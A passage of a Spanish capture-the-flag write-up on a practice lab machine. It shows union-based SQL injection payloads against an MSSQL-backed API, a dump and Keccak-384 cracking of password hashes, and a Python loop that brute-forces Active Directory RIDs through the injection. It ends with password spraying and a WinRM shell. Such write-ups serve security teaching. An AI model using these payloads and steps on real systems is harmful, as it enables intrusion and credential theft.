     {
          "id": 13,
          "name": "Nikola Bourne",
          "position": "Head of Accounts",
          "email": "nbourne@megacorp.htb",
          "src": "nbourne.jpg"
     },
     {
          "id": 2,
          "name": "Octavia Kent",
          "position": "Senior Consultant",
          "email": "okent@megacorp.htb",
          "src": "okent.jpg"
     },
     {
          "id": 8,
          "name": "Reya Martin",
          "position": "Tech Support",
          "email": "rmartin@megacorp.htb",
          "src": "rmartin.jpg"
     },
     {
          "id": 1,
          "name": "Sarina Bauer",
          "position": "Junior Developer",
          "email": "sbauer@megacorp.htb",
          "src": "sbauer.jpg"
     },
     {
          "id": 5,
          "name": "Shayna Stafford",
          "position": "HR Manager",
          "email": "shayna@megacorp.htb",
          "src": "shayna.jpg"
     },
     {
          "id": 9,
          "name": "Zac Curtis",
          "position": "Junior Analyst",
          "email": "zac@magacorp.htb",
          "src": "zac.jpg"
     },
     {
          "id": 14,
          "name": "Zachery Powers",
          "position": "Credit Analyst",
          "email": "zpowers@megacorp.htb",
          "src": "zpowers.jpg"
     }
]
```

Por lo que quiero pensar que tiene 5 columnas

Si aplico una selección y en la respuesta se ve reflejado algún número, me podría aprovechar de ese campo para dumpear datos

```null
-> ' union select 1,2,3,4,5-- -
null
```

Pero no me devuelve nada. Si introduzco una cadena al principio, la cosa cambia

```null
-> test' union select 1,2,3,4,5-- -
[
     {
          "id": 1,
          "name": "2",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Me podría aprovechar de cualquiera menos del primero, ya que es un entero porque no está entre doble comillas

Supongo que por detrás hay un Microsoft SQL

```null
-> test' union select 1,db_name(),3,4,5-- -
[
     {
          "id": 1,
          "name": "Hub_DB",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Para ver las bases de datos existenetes, introduzco lo siguiente:

```null
python3 sqli_tampers.py
-> test' union select 1,schema_name,3,4,5 from information_schema.schemata-- -
[
     {
          "id": 1,
          "name": "db_accessadmin",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_backupoperator",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_datareader",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_datawriter",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_ddladmin",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_denydatareader",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_denydatawriter",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_owner",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "db_securityadmin",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "dbo",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "guest",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "INFORMATION_SCHEMA",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "sys",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Enumero las tablas para la base de datos dbo

```null
python3 sqli_tampers.py
-> test' union select 1,table_name,3,4,5 from information_schema.tables where table_schema="dbo"-- -
null
```

Las comillas dobles dan problemas, así que utilizaré simples

```null
python3 sqli_tampers.py
-> test' union select 1,table_name,3,4,5 from information_schema.tables where table_schema="dbo"-- -
null
-> test' union select 1,table_name,3,4,5 from information_schema.tables where table_schema='dbo'-- -
[
     {
          "id": 1,
          "name": "Colleagues",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "Logins",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

La tabla "Colleagues" me imagino que corresponde a los usuarios se veían desde la web. Pero la otra todavía no la he visto

```null
-> test' union select 1,column_name,3,4,5 from information_schema.columns where table_schema='dbo' and table_name='Logins'-- -
[
     {
          "id": 1,
          "name": "id",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "password",
          "position": "3",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "username",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Dumpeo los datos de las columnas "username" y "password"

```null
-> test' union select 1,username,password,4,5 from Logins-- -
[
     {
          "id": 1,
          "name": "aldom",
          "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "alyx",
          "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "ckane",
          "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "cyork",
          "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "egre55",
          "position": "cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "ilee",
          "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "james",
          "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "jorden",
          "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "kpage",
          "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "minatotw",
          "position": "cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "nbourne",
          "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "okent",
          "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "rmartin",
          "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "sbauer",
          "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "shayna",
          "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "zac",
          "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
          "email": "4",
          "src": "5"
     },
     {
          "id": 1,
          "name": "zpowers",
          "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
          "email": "4",
          "src": "5"
     }
]
```

Almaceno los usuarios con sus respectivos hashes en un diccionario y los pruebo a crackear por fuerza bruta, pero no encuentra nada

```null
john -w:/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA384 [SHA384 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2023-01-25 10:05) 0g/s 10866Kp/s 10866Kc/s 43465KC/s "camilap91..*7¡Vamos!
Session completed.
```

Puede ser que no haya detectado bien el tipo de hash, así que con hashcat, muestro los ejemplos y filtro por SHA384, para ver sus variantes

Y encuentra cuatro diferentes

```null
hashcat --example-hashes | grep "\-384" -B 5
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #10800
  Name................: SHA2-384
--
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #17500
  Name................: SHA3-384
--
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #17900
  Name................: Keccak-384
--
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #27300
  Name................: SNMPv3 HMAC-SHA512-384

```

Quedandome con el modo, vuelvo a aplicar la fuerza bruta

Probando con el primer método no encuentra nada

```null
hashcat -m 10800 -a 0 hashes /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 3498/7060 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 17 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 10800 (SHA2-384)
Hash.Target......: hashes
Time.Started.....: Wed Jan 25 10:36:48 2023 (5 secs)
Time.Estimated...: Wed Jan 25 10:36:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3017.0 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 0/4 (0.00%) Digests (total), 0/4 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 37%

Started: Wed Jan 25 10:36:27 2023
Stopped: Wed Jan 25 10:36:54 2023
```

El segundo tampoco

```null
hashcat -m 17500 -a 0 hashes /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 3498/7060 MB (1024 MB allocatable), 4MCU

/usr/share/hashcat/OpenCL/m17500_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 17 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Salt
* Raw-Hash
* Uses-64-Bit

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 17500 (SHA3-384)
Hash.Target......: hashes
Time.Started.....: Wed Jan 25 10:37:47 2023 (6 secs)
Time.Estimated...: Wed Jan 25 10:37:53 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2584.3 kH/s (0.35ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 0/4 (0.00%) Digests (total), 0/4 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 3094/14344385 (0.02%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217265626f756e642121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 42%

Started: Wed Jan 25 10:37:33 2023
Stopped: Wed Jan 25 10:37:54 2023
```

Pero con el tercero encuentra tres contraseñas

```null
hashcat -m 17900 -a 0 hashes /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 3498/7060 MB (1024 MB allocatable), 4MCU

/usr/share/hashcat/OpenCL/m17900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 17 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Salt
* Raw-Hash
* Uses-64-Bit

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 17900 (Keccak-384)
Hash.Target......: hashes
Time.Started.....: Wed Jan 25 10:39:04 2023 (6 secs)
Time.Estimated...: Wed Jan 25 10:39:10 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2262.9 kH/s (0.38ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 3/4 (75.00%) Digests (total), 3/4 (75.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 3094/14344385 (0.02%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217265626f756e642121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 49%

Started: Wed Jan 25 10:38:49 2023
Stopped: Wed Jan 25 10:39:11 2023
```

Filtrando por cada hash en el archivo, puedo ver a que usuario pertenecen, aunque no sirve de nada porque ninguna es correcta

```null
crackmapexec smb 10.10.10.179 -u users -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minato:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minato:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minato:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:banking1 STATUS_LOGON_FAILURE 
```

Podría tratar de enumerar información de los usuarios del Directorio Activo a través de la inyección SQL

Por ejemplo, para ver el nombre del dominio puedo introducir lo siguiente:

```null
-> test' union select 1,default_domain(),3,4,5-- -
[
     {
          "id": 1,
          "name": "MEGACORP",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Introduzco una query que me permite ver la combinación de la suma del RID + SID

```null
-> test' union select 1,SUSER_SID('MEGACORP\Administrator'),3,4,5-- -
[
     {
          "id": 1,
          "name": "\u0001\u0005\u0000\u0000\u0000\u0000\u0000\u0005\u0015\u0000\u0000\u0000\u001c\u0000\u00d1\u00bc\u00d1\u0081\u00f1I+\u00df\u00c26\u00f4\u0001\u0000\u0000",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Está en formato unicode, el mismo que utilicé para la inyección SQL

Lo represento en hexadecimal

```null
-> test' union select 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator')),3,4,5-- -
[
     {
          "id": 1,
          "name": "0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000",
          "position": "3",
          "email": "4",
          "src": "5"
     }
```

Toda la cadena, sin contar con el '0x', tiene un total de 56 caracteres, de los cuales los 48 primeros corresponden al RID y el resto al SID

```null
echo -n "0105000000000005150000001c00d1bcd181f1492bdfc236f4010000" | wc -c
56
```

Si me quedo con el SID, y lo pongo en formato big endian para hacer el reversing de hexadecimal:

```null
echo -n "0105000000000005150000001c00d1bcd181f1492bdfc236f4010000" | tail -c 8
f4010000
```

Los ceros los puedo omitir

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x01f4
500
```

Como la prueba la he hecho con el usuario Administrador, tiene sentido que su SID sea 500

Puedo aplicar el proceso inverso, en la inyección SQL le paso como input la suma de RID + SID, para que me devuelva el usuario al que pertenece. Como el SID va a permanecer constante, podría aplicar fuerza bruta con respecto al RID para así obtener todos los usuarios del Directorio Activo

```null
-> test' union select 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5-- -
[
     {
          "id": 1,
          "name": "MEGACORP\\Administrator",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Si sumo una unidad al RID, quedaría lo siguiente:

```null
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(501)
'0x1f5'
```

Lo convierto a big endian y lo cambio en la query de la sqli

```null
-> test' union select 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000),3,4,5-- -
[
     {
          "id": 1,
          "name": "MEGACORP\\Guest",
          "position": "3",
          "email": "4",
          "src": "5"
     }
]
```

Y tengo otro usuario que no tenía contemplado en el diccionario

Modifico el script de python para aplicar fuerza bruta en un rango de RIDs

Para ello creo una nueva función y sustituyo el bucle infinito por un intervalo

La nueva función es la siguiente

```null
def bruteforceRID(RID):
    
    hex_RID = hex(RID).replace('x', '')

    list = []

    for character in hex_RID:
        list.append(character)

    RID = list[2] + list[3] + list[0] + list[1] + "0000"

    return RID
```

El main tendrá este aspecto

```null
if __name__ == '__main__':

    for num in range(500, 550): # Mediante un bucle infinito, solicito el input que quiero transformar

        RID = bruteforceRID(num)

        sqli = "test' union select 1,SUSER_SNAME(%s%s),3,4,5-- -" % (SID, RID)
        sqli = sqli.strip()

        formatunicode(sqli)

        sqli_formated = formatunicode(sqli)

        toprint = makeRequest(sqli_formated)

        makeRequest(sqli_formated)

        print(toprint)

        time.sleep(1) # Necesario para que no bloquee el WAF
```

Ejecuto el script y almaceno todo el output en un archivo

```null
python3 sqli_tampers.py > data
```

En el intervalo que he introducido, solo va a reportar grupos

```null
"name": "MEGACORP\\Administrator",
"name": "MEGACORP\\Guest",
"name": "MEGACORP\\krbtgt",
"name": "MEGACORP\\DefaultAccount",
"name": "MEGACORP\\Domain Admins",
"name": "MEGACORP\\Domain Users",
"name": "MEGACORP\\Domain Guests",
"name": "MEGACORP\\Domain Computers",
"name": "MEGACORP\\Domain Controllers",
"name": "MEGACORP\\Cert Publishers",
"name": "MEGACORP\\Schema Admins",
"name": "MEGACORP\\Enterprise Admins",
"name": "MEGACORP\\Group Policy Creator Owners",
"name": "MEGACORP\\Read-only Domain Controllers",
"name": "MEGACORP\\Cloneable Domain Controllers",
"name": "MEGACORP\\Protected Users",
"name": "MEGACORP\\Key Admins",
"name": "MEGACORP\\Enterprise Key Admins",
```

Para poder ver los usuarios, es mejor iterar desde el 1000 hacia delante

Consigo 3 nuevos

```null
"name": "MEGACORP\\tushikikatomo",
"name": "MEGACORP\\andrew",
"name": "MEGACORP\\lana",
```

Como tengo contraseñas de antes, pruebo un password spraying

```null
crackmapexec smb 10.10.10.179 -u new_users -p passwords
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
```

El usuario tushikikatomo tiene de contraseña finance1, pero no puedo conseguir una shell por SMB.

Si pruebo a conectarme por winrm

```null
crackmapexec winrm 10.10.10.179 -u 'tushikikatomo' -p 'finance1'
SMB         10.10.10.179    5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        10.10.10.179    5985   MULTIMASTER      [*] http://10.10.10.179:5985/wsman
WINRM       10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)
```

Me conecto como ese usuario con evil-winrm

```null
 evil-winrm -i 10.10.10.179 -u 'tushikikatomo' -p 'finance1'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\alcibiades\Documents> 
```

Puedo visualizar la primera flag

```null
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> type user.txt
629bdc654f8fab6e367bf64c9c097361
```

# Escalada

No tengo ningún privilegio especial

```null
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Tampoco estoy en ningún grupo del que pueda abusar

```null
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> net user tushikikatomo
